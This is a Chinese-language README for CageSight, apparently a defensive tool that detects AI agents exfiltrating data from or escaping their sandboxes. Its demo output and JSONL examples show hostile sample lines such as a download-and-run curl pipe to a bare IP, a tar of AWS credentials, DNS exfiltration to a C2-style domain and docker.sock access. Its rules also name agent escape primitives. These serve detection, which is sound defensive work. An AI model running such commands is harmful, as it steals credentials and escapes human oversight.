# CageSight

> 看见 Agent 从沙箱里偷偷带出去的东西。

CageSight 是一个**零依赖**的 AI Agent 沙箱外传 / 逃逸检测工具。它不负责隔离，负责在隔离失效之前把证据留下来。

- 三种模式：**沙箱配置体检**、**运行时事件检测**、**网络流量检测**
- 29 条检测规则，覆盖 DNS 隧道、凭据收集、逃逸原语、数据打包、执行链
- 跨数据源关联，把零散告警串成「凭据 → 打包 → 外发」完整链路
- 输出 table / JSON / SARIF / Markdown，可直接接 CI 与工单系统
- 纯 Python 标准库，`pip install` 后即可离线运行

---

## 为什么需要它

Agent 沙箱解决的是「不让它跑出去」，但很少回答三个问题：

1. **沙箱本身够不够硬？** 挂载了 `docker.sock`、`--privileged`、共享宿主 PID 命名空间的「沙箱」遍地都是。
2. **它运行时到底干了什么？** 读了 `~/.aws/credentials`、`ptrace` 了别的进程、`unshare` 了新命名空间——这些在业务日志里完全看不见。
3. **数据是怎么出去的？** 大部分外带不走 HTTP，而是走 DNS 查询、TXT 记录、几十个字符的随机子域。

现有工具里，`nono`、`ClaudeCage`、`code-on-incus` 解决第 1 步的**隔离执行**；Falco / Tetragon 提供通用主机运行时安全，但规则是系统语义，不认识「Agent 正在收集凭据并打包」这种组合行为。CageSight 补的是**检测层**：面向 Agent 行为模型，做跨源关联。

## 三种模式

| 模式 | 输入 | 回答的问题 | 命令 |
| --- | --- | --- | --- |
| 静态体检 | `docker inspect` / K8s Pod / compose / seccomp | 沙箱配置能不能被直接逃逸 | `cagesight audit-config` |
| 事件检测 | auditd / strace / 归一化 JSONL | Agent 运行时做了哪些敏感动作 | `cagesight scan` |
| 流量检测 | pcap | 有没有数据正在通过 DNS / TLS 出去 | `cagesight pcap` |

## 快速开始

```bash
git clone https://github.com/<you>/cagesight.git
cd cagesight
pip install -e .

# 内置演示：一条完整的「读云凭据 → 打包 → DNS 外带 → 反弹 Shell」链路
cagesight demo
```

> Windows 若启用了应用控制策略（WDAC / Device Guard），`pip install` 生成的 `cagesight.exe` 可能被拦截。
> 此时改用 `python -m cagesight <command>`，功能完全一致；Linux / macOS 不受影响。

演示输出（节选）：

```text
CageSight 0.1.0 | events=58 shown=17/17 duration=0.00s | critical=6 high=8 medium=3 low=0

TIME      SEV             RULE           PID/COMM            EVIDENCE
08:00:01  CRITICAL(90)    CS-CRED-002    4242/python3        path=/home/agent/.aws/credentials group=cloud comm=python3
08:00:04  HIGH(70)        CS-STG-001     4242/python3        cmd=sh -c tar czf /tmp/loot.tgz /home/agent/.aws ...
08:00:06  CRITICAL(90)    CS-EXEC-001    4242/sh             cmd=sh -c curl -s http://45.77.12.9/x.sh | sh
08:00:07  CRITICAL(90)    CS-ESC-002     4242/python3        pid=4242 comm=python3 unshare()
08:00:08  CRITICAL(90)    CS-ESC-006     4242/python3        path=/var/run/docker.sock comm=python3
08:00:10  CRITICAL(100)   CS-CHAIN-001   4242/python3        CS-CRED-002@08:00:01 -> CS-STG-001@08:00:04 -> CS-NET-002...
08:00:20  HIGH(70)        CS-DNS-001     4242/python3        qname=mftwk3tufvwg633ufvrgy33dnmwtambq.exfil-c2.net base=...

结论: 存在完整攻击链，建议立即处置
```

## 检测能力

| 类别 | 规则 | 说明 |
| --- | --- | --- |
| DNS 隧道 | CS-DNS-001~004 | 高熵长子域、高频查询、TXT/NULL 滥用、唯一子域比例 |
| 出站行为 | CS-NET-001~005 | 非白名单目标、裸 IP 直连、Raw Socket、大流量上传、非常规端口 |
| 凭据收集 | CS-CRED-001~006 | SSH 私钥、云凭据、环境变量、容器/集群凭据、系统敏感文件、云元数据服务 |
| 逃逸原语 | CS-ESC-001~006 | ptrace、setns/unshare、mount、内核模块、/proc 写入、运行时 Socket |
| 数据暂存 | CS-STG-001~002 | 临时目录打包、敏感目录批量读取 |
| 执行链 | CS-EXEC-001~004 | 下载即执行、base64 解码执行、临时目录解释器、反弹 Shell |
| 关联 | CS-CHAIN-001~002 | 凭据→打包→外发；逃逸→执行 |

完整规则说明见 [docs/rules.md](docs/rules.md)，可用 `cagesight rules` 查看当前规则。

## 数据采集

### auditd（推荐，内核态、覆盖全）

```bash
auditctl -a always,exit -F arch=b64 -S execve,connect,openat,ptrace,setns,unshare,mount \
         -k agent_sandbox
ausearch -k agent_sandbox --raw > agent.audit
cagesight scan agent.audit
```

### strace（单进程调试）

```bash
strace -f -tt -s 256 -o agent.strace python agent.py
cagesight scan agent.strace
```

### pcap（在沙箱 veth 上抓包）

```bash
tcpdump -i veth-agent -w agent.pcap -s 0
cagesight pcap agent.pcap
```

### JSONL（自定义接入）

任何能产出事件的系统都可以对接，字段见下表；未提供的字段留空即可。

```json
{"ts": 1794182400.1, "kind": "dns", "domain": "aGVsbG8.exfil.net", "qtype": "TXT", "dst_ip": "8.8.8.8", "dst_port": 53}
{"ts": 1794182401.2, "kind": "file", "pid": 4242, "comm": "python3", "path": "/home/agent/.aws/credentials"}
{"ts": 1794182402.3, "kind": "exec", "pid": 4242, "argv": ["sh", "-c", "tar czf /tmp/x.tgz /data"]}
```

## 输出与集成

```bash
cagesight scan agent.audit --format json  --out report.json
cagesight scan agent.audit --format sarif --out report.sarif   # GitHub Code Scanning
cagesight scan agent.audit --format md    --out report.md
```

退出码约定：命中 `--fail-on`（默认 `high`）返回 `2`，可直接用于 CI 卡点。

## 响应动作

默认 **dry-run**，只打印处置计划，不改动系统：

```bash
cagesight scan agent.audit --block            # 打印 nft/iptables 封禁命令
cagesight scan agent.audit --kill             # 打印待终止进程
cagesight scan agent.audit --block --kill --enforce   # 真正执行
cagesight scan agent.audit --webhook https://your.siem/hook
```

> 自动封禁默认使用 nft，需要预先创建 `cagesight` 表与 output 链；未创建时请只使用 dry-run 输出手工执行。
> `--kill` 会拒绝终止 pid 0/1 和工具自身，但仍假设输入日志可信——不要对来源不明的日志启用 `--enforce`。

## 架构

```text
 auditd ─┐
 strace ─┼─→ parsers ─→ Event ─→ detectors ─→ correlation ─→ report
  pcap  ─┤              (归一化)   (7 类规则)    (跨源链路)    ├─ table/json
  jsonl ─┘                                                    ├─ sarif
                                                              └─ markdown
 配置体检：docker inspect / k8s / compose / seccomp ─→ SBX-001~012
```

## 与同类工具的差异

| 工具 | 定位 | 与 CageSight 的关系 |
| --- | --- | --- |
| nono / ClaudeCage / code-on-incus | 隔离执行层 | 先隔离，再用 CageSight 验证隔离是否被绕过 |
| Falco / Tetragon | 通用主机运行时安全 | CageSight 规则面向 Agent 行为，并做跨源链路关联 |
| SkillGuard CLI | Skill / Prompt 静态扫描 | 一个管「说明书」，一个管「运行结果」 |

## 已知局限

- 只做检测，不做隔离与阻断（阻断仅在 `--enforce` 下生成/执行防火墙命令）
- pcap 解析暂不支持 pcapng、QUIC、DoH/DoT、IP 分片重组与 DNS-over-TCP；TCP 分段导致 SNI 跨包时可能漏检；加密流量只能看到 SNI
- 时间窗口与熵阈值需要按业务基线调优，默认值偏向中大型沙箱
- JSONL 输入建议显式提供 `ts`（epoch 秒或 ISO8601）；缺失时按读取时间处理，跨源关联会失真
- 生产环境若使用内网 DNS（如 `10.x.x.x:53`）或内网制品库，需要把对应网段加入 `allowlist.cidrs`，否则会触发 `CS-NET-001`
- `CS-NET-004`（大流量上传）依赖字节数，只有 pcap 数据源能触发；auditd / strace 只能看到连接行为
- 同一份日志包含多个沙箱时，跨源关联可能把不同实例的行为串成一条链，建议按沙箱拆分日志分别扫描
- Windows / macOS 仅支持日志分析，实时采集依赖 Linux 的 auditd / eBPF

## Roadmap

- [ ] eBPF collector，替代 auditd 的高开销采集
- [ ] DoH / DoT / QUIC 的域名可见性
- [ ] 与 Claude Code / OpenClaw 的 hook 集成，做到工具调用级审计
- [ ] 多沙箱会话隔离，避免同宿主机日志串链
- [ ] 规则热更新与误报反馈闭环

## 授权声明

本项目仅用于**自有或已获授权环境**的安全检测与防御研究。请勿用于未授权的目标。

## License

MIT
